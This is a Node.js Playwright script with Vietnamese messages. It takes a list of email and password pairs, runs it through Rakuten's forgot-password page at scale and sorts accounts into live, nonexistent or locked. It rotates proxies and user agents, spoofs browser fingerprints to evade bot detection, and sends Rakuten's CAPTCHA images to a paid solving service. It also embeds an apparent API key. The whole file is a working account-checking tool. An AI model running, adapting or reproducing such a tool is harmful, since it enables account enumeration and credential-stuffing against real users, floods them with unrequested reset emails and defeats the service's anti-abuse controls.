const fs = require("fs");
const path = require("path");
const readline = require("readline/promises");
const { stdin, stdout } = require("process");
const { chromium } = require("playwright");

const API_KEY =
  process.env.GEMCAPTCHA_API_KEY ||
  "GEM_WS2N6XYJYJJCB9VQ70HWMRCEBIHZK54VEXQ7FGOGYMEOXT5XLLZS0DJQRK2GZI1775533151";
const LOG_FILE = path.join(process.cwd(), "rakuten_automation.log");
const USER_DATA_DIR = path.join(process.cwd(), "user-data");

const COLOR_RESET = "\x1b[0m";
const COLOR_INFO = "\x1b[32m";
const COLOR_WARNING = "\x1b[33m";
const COLOR_ERROR = "\x1b[31m";

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
];

let showBrowser = true;
let shuttingDown = false;
let activeBrowsers = new Set();
let successfulAccounts = [];
let failedAccounts = [];

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function nowTime() {
  return new Date().toLocaleTimeString("en-GB", {
    hour12: false,
    hour: "2-digit",
    minute: "2-digit",
  });
}

function log(level, message) {
  const levelText = level.toUpperCase();
  const line = `${nowTime()} - ${levelText} - ${message}`;
  const fileLine = `${new Date().toISOString()} - ${levelText} - ${message}`;

  fs.appendFileSync(LOG_FILE, `${fileLine}\n`, "utf8");

  let color = "";
  if (levelText === "INFO") color = COLOR_INFO;
  if (levelText === "WARNING") color = COLOR_WARNING;
  if (levelText === "ERROR") color = COLOR_ERROR;

  stdout.write(`${color}${line}${COLOR_RESET}\n`);
}

function info(message) {
  log("info", message);
}

function warning(message) {
  log("warning", message);
}

function error(message) {
  log("error", message);
}

function isInvalidSessionError(err) {
  const message = String(err || "").toLowerCase();
  return (
    message.includes("invalid session id") ||
    message.includes("session deleted as the browser has closed the connection")
  );
}

async function safeShutdownBrowser(browser) {
  if (!browser) return;

  try {
    await browser.close();
  } catch (err) {
    if (!isInvalidSessionError(err)) {
      warning(`Lỗi khi đóng browser: ${String(err)}`);
    }
  } finally {
    activeBrowsers.delete(browser);
  }
}

async function cleanupBrowsers() {
  info("Đang dọn dẹp browser...");
  const snapshot = Array.from(activeBrowsers);
  await Promise.all(snapshot.map((browser) => safeShutdownBrowser(browser)));
}

async function cleanAllUserData(retries = 5, delay = 1000) {
  info("Đang dọn dẹp dữ liệu người dùng...");

  if (!fs.existsSync(USER_DATA_DIR)) {
    return;
  }

  for (let attempt = 1; attempt <= retries; attempt += 1) {
    try {
      fs.rmSync(USER_DATA_DIR, { recursive: true, force: true });
      info("Đã dọn dẹp dữ liệu người dùng thành công.");
      return;
    } catch (err) {
      if (attempt < retries) {
        warning(`Đang dọn dẹp dữ liệu. Thử lại sau ${delay / 1000}s...`);
        await sleep(delay);
      } else {
        error(
          `Không thể dọn dẹp dữ liệu người dùng sau ${retries} lần thử: ${String(err)}`,
        );
      }
    }
  }
}

function signalHandler() {
  if (shuttingDown) return;
  shuttingDown = true;

  (async () => {
    info("Nhận tín hiệu dừng. Đang dọn dẹp...");
    await cleanupBrowsers();
    await cleanAllUserData();
    info("Dọn dẹp hoàn tất. Thoát...");
    process.exit(0);
  })().catch((err) => {
    error(`Lỗi khi xử lý tín hiệu dừng: ${String(err)}`);
    process.exit(1);
  });
}

function parseProxyLine(line) {
  const raw = line.trim();
  if (!raw || raw.startsWith("#")) return null;

  if (raw.includes("://")) {
    try {
      const url = new URL(raw);
      return {
        server: `${url.protocol}//${url.hostname}${url.port ? `:${url.port}` : ""}`,
        username: url.username || undefined,
        password: url.password || undefined,
      };
    } catch {
      return { server: raw };
    }
  }

  if (raw.includes("@")) {
    const [hostPort, credentials] = raw.split("@", 2);
    const [username, password] = credentials.includes(":")
      ? credentials.split(":", 2)
      : credentials.split("-", 2);
    return {
      server: `http://${hostPort}`,
      username,
      password,
    };
  }

  const parts = raw.split(":");
  if (parts.length === 4) {
    const [host, port, username, password] = parts;
    return {
      server: `http://${host}:${port}`,
      username,
      password,
    };
  }

  if (parts.length === 2) {
    return {
      server: `http://${raw}`,
    };
  }

  return { server: raw };
}

function loadInputFiles() {
  try {
    const accounts = [];
    const accountText = fs.readFileSync(
      path.join(process.cwd(), "accounts.txt"),
      "utf8",
    );

    for (const rawLine of accountText.split(/\r?\n/)) {
      const line = rawLine.trim();
      if (!line || line.startsWith("#") || !line.includes("||")) continue;

      const parts = line.split("||");
      if (parts.length >= 2) {
        accounts.push({
          email: parts[0].trim(),
          password: parts[1].trim(),
        });
      }
    }

    const proxies = [];
    try {
      const proxyText = fs.readFileSync(
        path.join(process.cwd(), "proxy.txt"),
        "utf8",
      );
      for (const rawLine of proxyText.split(/\r?\n/)) {
        const proxy = parseProxyLine(rawLine);
        if (proxy) proxies.push(proxy);
      }
    } catch (err) {
      warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.");
    }

    if (!accounts.length) {
      throw new Error("Không có tài khoản để xử lý");
    }

    info(`Đã tải ${accounts.length} tài khoản và ${proxies.length} proxy`);
    return { accounts, proxies };
  } catch (err) {
    error(`Lỗi khi tải file đầu vào: ${String(err)}`);
    throw err;
  }
}

async function initDriver(proxy = null) {
  const launchOptions = {
    headless: !showBrowser,
    args: [
      "--disable-blink-features=AutomationControlled",
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-infobars",
      "--ignore-certificate-errors",
      "--allow-insecure-localhost",
      "--allow-running-insecure-content",
      "--disable-web-security",
      "--disable-gpu",
    ],
  };

  if (proxy && proxy.server) {
    launchOptions.proxy =
      proxy.username && proxy.password
        ? {
            server: proxy.server,
            username: proxy.username,
            password: proxy.password,
          }
        : { server: proxy.server };
  }

  const browser = await chromium.launch(launchOptions);
  activeBrowsers.add(browser);

  const context = await browser.newContext({
    userAgent: userAgents[Math.floor(Math.random() * userAgents.length)],
    viewport: showBrowser
      ? { width: 1280, height: 720 }
      : { width: 1920, height: 1080 },
    locale: "en-US",
  });

  await context.addInitScript(() => {
    Object.defineProperty(navigator, "webdriver", { get: () => undefined });
    window.navigator.chrome = { runtime: {} };
    Object.defineProperty(navigator, "plugins", { get: () => [1, 2, 3] });
    Object.defineProperty(navigator, "languages", {
      get: () => ["en-US", "en"],
    });
  });

  const page = await context.newPage();
  return { browser, context, page };
}

async function extractCaptchaBase64(imgSrc) {
  try {
    if (imgSrc && imgSrc.startsWith("data:image") && imgSrc.includes(",")) {
      return imgSrc.split(",", 2)[1];
    }

    if (imgSrc) {
      const response = await fetch(imgSrc, { method: "GET" });
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      const arrayBuffer = await response.arrayBuffer();
      return Buffer.from(arrayBuffer).toString("base64");
    }
  } catch (err) {
    error(`Không thể lấy captcha image từ imgSrc: ${String(err)}`);
  }

  return "";
}

async function resolveCaptcha(base64Image) {
  if (!API_KEY || API_KEY === "YOUR_GEMCAPTCHA_API_KEY") {
    error("GemCaptcha API key chưa được cấu hình.");
    return "";
  }

  const createTaskUrl = "https://api.gemcaptcha.com/v2/createTask";
  const getResultUrl = "https://api.gemcaptcha.com/v2/getTaskResult";

  try {
    const createResp = await fetch(createTaskUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        clientKey: API_KEY,
        task: {
          type: "ImageToTextTask",
          imageBase64: base64Image,
          module: "module_1",
        },
      }),
    });

    const createData = await createResp.json();
    if (createData.errorId !== 0) {
      error(`GemCaptcha createTask lỗi: ${JSON.stringify(createData)}`);
      return "";
    }

    const taskId = createData.taskId;
    if (!taskId) {
      error(`GemCaptcha không trả về taskId: ${JSON.stringify(createData)}`);
      return "";
    }

    const maxWaitSeconds = 60;
    const pollIntervalSeconds = 2;
    const deadline = Date.now() + maxWaitSeconds * 1000;

    while (Date.now() < deadline) {
      const resultResp = await fetch(getResultUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ clientKey: API_KEY, taskId }),
      });

      const resultData = await resultResp.json();
      if (resultData.errorId !== 0) {
        error(`GemCaptcha getTaskResult lỗi: ${JSON.stringify(resultData)}`);
        return "";
      }

      if (resultData.status === "ready") {
        const solvedText = String(resultData.solution?.text || "").trim();
        if (solvedText) return solvedText;
        error(
          `GemCaptcha trả về trạng thái ready nhưng không có text: ${JSON.stringify(resultData)}`,
        );
        return "";
      }

      await sleep(pollIntervalSeconds * 1000);
    }

    error("GemCaptcha timeout khi chờ kết quả captcha.");
    return "";
  } catch (err) {
    error(`Lỗi resolve captcha: ${String(err)}`);
    return "";
  }
}

async function getShadowCaptchaData(page) {
  try {
    return await page.evaluate(() => {
      const el = document.querySelector("r10-challenger");
      if (!el || !el.challengerMain || !el.challengerMain.cores) return null;

      const core = el.challengerMain.cores.values().next();
      if (!core || core.done || !core.value || !core.value.challenge)
        return null;

      const challenge = core.value.challenge;
      return {
        hasInput: !!challenge.cres_element,
        imgSrc: challenge.imgSrc || "",
      };
    });
  } catch (err) {
    error(`Không thể lấy captcha từ shadow root: ${String(err)}`);
    return null;
  }
}

async function clearCaptchaInput(page) {
  await page.evaluate(() => {
    const el = document.querySelector("r10-challenger");
    if (!el || !el.challengerMain || !el.challengerMain.cores) return;

    const core = el.challengerMain.cores.values().next();
    if (!core || core.done || !core.value || !core.value.challenge) return;

    const inputEl = core.value.challenge.cres_element;
    if (!inputEl) return;

    inputEl.value = "";
    inputEl.dispatchEvent(new Event("input", { bubbles: true }));
    inputEl.dispatchEvent(new Event("change", { bubbles: true }));
  });
}

async function setCaptchaInput(page, value) {
  await page.evaluate((captchaValue) => {
    const el = document.querySelector("r10-challenger");
    if (!el || !el.challengerMain || !el.challengerMain.cores) return;

    const core = el.challengerMain.cores.values().next();
    if (!core || core.done || !core.value || !core.value.challenge) return;

    const inputEl = core.value.challenge.cres_element;
    if (!inputEl) return;

    inputEl.value = captchaValue;
    inputEl.dispatchEvent(new Event("input", { bubbles: true }));
    inputEl.dispatchEvent(new Event("change", { bubbles: true }));
  }, value);
}

async function saveRetryAccountToFile(account, message) {
  fs.appendFileSync(
    path.join(process.cwd(), "chaylai.txt"),
    `${account.email}|${account.password}|${account.name_f || ""}|${message}\n`,
    "utf8",
  );
}

async function saveAccountToFile(filename, account, message) {
  fs.appendFileSync(
    path.join(process.cwd(), filename),
    `${account.email}|${account.password}|${message}\n`,
    "utf8",
  );
}

async function safeClick(locator) {
  try {
    await locator.scrollIntoViewIfNeeded();
    await locator.click({ timeout: 10000 });
  } catch (err) {
    try {
      await locator.evaluate((el) => el.click());
    } catch (fallbackErr) {
      warning(
        `Cả hai phương pháp click đều thất bại: ${String(err)}, ${String(fallbackErr)}`,
      );
      throw fallbackErr;
    }
  }
}

async function solveAndSubmitCaptcha(page, account, email, maxAttempts = 5) {
  for (
    let captchaAttempt = 1;
    captchaAttempt <= maxAttempts;
    captchaAttempt += 1
  ) {
    const captchaData = await getShadowCaptchaData(page);
    const hasInput = captchaData?.hasInput;
    const imgSrc = captchaData?.imgSrc || "";

    if (!hasInput || !imgSrc) {
      await saveRetryAccountToFile(
        account,
        "Không lấy được input/src captcha từ shadow root",
      );
      return { ok: false, message: "Không lấy được captcha từ shadow root" };
    }

    await clearCaptchaInput(page);

    const base64Image = await extractCaptchaBase64(imgSrc);
    let captchaText = await resolveCaptcha(base64Image);

    if (!captchaText) {
      warning(`⚠️ ${email} - Không giải được captcha ở lần ${captchaAttempt}.`);
      if (captchaAttempt >= maxAttempts) {
        await saveRetryAccountToFile(
          account,
          "Không giải được captcha sau khi thử lại",
        );
        return {
          ok: false,
          message: "Captcha không giải được sau khi thử lại",
        };
      }

      await sleep(1500);
      continue;
    }

    captchaText = captchaText.toUpperCase();
    await setCaptchaInput(page, captchaText);
    await sleep(5000);

    const sendEmailButton = page
      .getByText("Send email", { exact: false })
      .first();
    await safeClick(sendEmailButton);
    await sleep(5000);
    try {
      await page
        .getByText("Value is invalid", { exact: false })
        .first()
        .waitFor({ timeout: 8000 });
    //   warning(`⚠️ ${email} - Captcha giải không thành công. Sẽ thử lại...`);
      if (captchaAttempt >= maxAttempts) {
        await saveRetryAccountToFile(
          account,
          "Captcha vẫn sai sau khi giải lại và submit lại",
        );
        return { ok: false, message: "Captcha vẫn sai sau khi thử lại" };
      }
      await sleep(3000);
      continue;
    } catch (waitErr) {
      return { ok: true, message: "" };
    }
  }

  return { ok: false, message: "Captcha xử lý thất bại" };
}

async function checkRakutenAccount(page, email, password, account) {
  try {
    await sleep(5000);
    info(`🔍 ${email} - Bắt đầu kiểm tra tài khoản...`);

    await page.goto(
      "https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in/forgot_password/email",
      {
        waitUntil: "domcontentloaded",
      },
    );

    await sleep(5000);

    const forgotLink = page
      .getByText("Forgot your password?", { exact: false })
      .first();
    await safeClick(forgotLink);
    await sleep(2000);

    const emailInput = page.locator("#email");
    await emailInput.fill(email);
    await sleep(2000);

    info(`🔍 ${email} - Đang giải captcha nếu có...`);
    const captchaResult = await solveAndSubmitCaptcha(page, account, email, 5);
    if (!captchaResult.ok) {
      warning(`❌ ${email} - Kiểm tra thất bại: ${captchaResult.message}`);
      return { ok: false, message: captchaResult.message };
    }

    await sleep(3000);

    try {
      await page
        .getByText("Password reset link successfully sent", { exact: false })
        .first()
        .waitFor({ timeout: 3000 });
      info(
        `✅ ${email} - Kiểm tra thành công: Tìm thấy thông báo gửi email thành công.`,
      );
      return { ok: true, message: "Acc live" };
    } catch {
      // ignore
    }

    try {
      await page
        .getByText("not associated with any existing accounts", {
          exact: false,
        })
        .first()
        .waitFor({ timeout: 3000 });
      info(
        `❌ ${email} - Kiểm tra thành công: Tìm thấy thông báo email không tồn tại.`,
      );
      return { ok: false, message: "Email không tồn tại" };
    } catch {
      // ignore
    }

    try {
      await page
        .getByText("Your account has been locked", { exact: false })
        .first()
        .waitFor({ timeout: 3000 });
      info(
        `❌ ${email} - Kiểm tra thành công: Tìm thấy thông báo tài khoản bị khóa.`,
      );
      return { ok: false, message: "Acc bị khóa" };
    } catch {
      // ignore
    }

    return { ok: false, message: "Không xác định được kết quả kiểm tra" };
  } catch (err) {
    error(`❌ Lỗi trong quá trình Kiểm tra cho ${email}: ${String(err)}`);
    return { ok: false, message: String(err) };
  }
}

async function removeAccountFromInputFile(email) {
  try {
    const filePath = path.join(process.cwd(), "accounts.txt");
    if (!fs.existsSync(filePath)) return;

    const lines = fs.readFileSync(filePath, "utf8").split(/\r?\n/);
    const filtered = lines.filter((line) => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) return true;
      const [lineEmail] = trimmed.split("||");
      return lineEmail?.trim() !== email;
    });

    fs.writeFileSync(
      filePath,
      `${filtered.join("\n").replace(/\n+$/, "")}${filtered.length ? "\n" : ""}`,
      "utf8",
    );
  } catch (err) {
    warning(`Lỗi khi cập nhật accounts.txt: ${String(err)}`);
  }
}

async function processAccount(browserFactory, account, accountIndex, proxies) {
  const email = account.email;
  const password = account.password;
  let browser = null;
  let context = null;
  let page = null;

  try {
    info(`Đang xử lý tài khoản ${accountIndex + 1}: ${email}`);
    const proxy = proxies.length
      ? proxies[accountIndex % proxies.length]
      : null;
    ({ browser, context, page } = await browserFactory(proxy));

    const result = await checkRakutenAccount(page, email, password, account);
    if (result.ok) {
      successfulAccounts.push(account);
      await saveAccountToFile(
        "successful_accounts.txt",
        account,
        "Kiểm tra thành công",
      );
    } else {
      failedAccounts.push({ account, error: result.message });
      await saveAccountToFile("failed_accounts.txt", account, result.message);
    }

    info(`Hoàn tất xử lý tài khoản: ${email}`);
  } catch (err) {
    error(`Lỗi xử lý tài khoản ${email}: ${String(err)}`);
    failedAccounts.push({ account, error: String(err) });
    await saveAccountToFile("failed_accounts.txt", account, String(err));
  } finally {
    await removeAccountFromInputFile(email);

    if (context) {
      try {
        await context.close();
      } catch {
        // ignore
      }
    }

    if (browser) {
      await safeShutdownBrowser(browser);
    }
  }
}

async function promptNumber(rl, questionText, fallback) {
  const answer = String(await rl.question(questionText)).trim();
  const parsed = Number.parseInt(answer, 10);
  if (Number.isFinite(parsed) && parsed > 0) return parsed;
  return fallback;
}

async function promptYesNo(rl, questionText, fallback = true) {
  const answer = String(await rl.question(questionText))
    .trim()
    .toLowerCase();
  if (!answer) return fallback;
  return ["y", "yes", "1", "true"].includes(answer);
}

async function main() {
  const { accounts, proxies } = loadInputFiles();

  await cleanAllUserData();

  const rl = readline.createInterface({ input: stdin, output: stdout });

  try {
    let numThreads = await promptNumber(rl, "Nhập số luồng để chạy: ", 1);
    if (numThreads > accounts.length) {
      warning(
        `Số luồng (${numThreads}) vượt quá số tài khoản (${accounts.length}). Đặt thành ${accounts.length}.`,
      );
      numThreads = accounts.length;
    }

    showBrowser = await promptYesNo(
      rl,
      "Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ",
      true,
    );

    const nextIndex = { value: 0 };
    const browserFactory = async (proxy) => initDriver(proxy);

    const workers = Array.from({ length: numThreads }, async () => {
      while (true) {
        const accountIndex = nextIndex.value;
        if (accountIndex >= accounts.length) break;
        nextIndex.value += 1;
        const account = accounts[accountIndex];
        await processAccount(browserFactory, account, accountIndex, proxies);
      }
    });

    await Promise.all(workers);

    info("Đã xử lý xong tất cả tài khoản.");
    info(`✅ Kiểm tra thành công: ${successfulAccounts.length}`);
    info(`❌ Kiểm tra thất bại: ${failedAccounts.length}`);

    await cleanAllUserData();
    info("Chương trình hoàn tất. Thoát sau 5 giây...");
    await sleep(5000);
  } finally {
    rl.close();
  }
}

process.on("uncaughtException", (err) => {
  error(`Uncaught exception: ${String(err)}`);
});

process.on("unhandledRejection", (err) => {
  error(`Unhandled rejection: ${String(err)}`);
});

process.on("SIGINT", signalHandler);
process.on("SIGTERM", signalHandler);

main()
  .catch((err) => {
    error(`Lỗi trong hàm main: ${String(err)}`);
    process.exitCode = 1;
  })
  .finally(async () => {
    await cleanupBrowsers();
  });
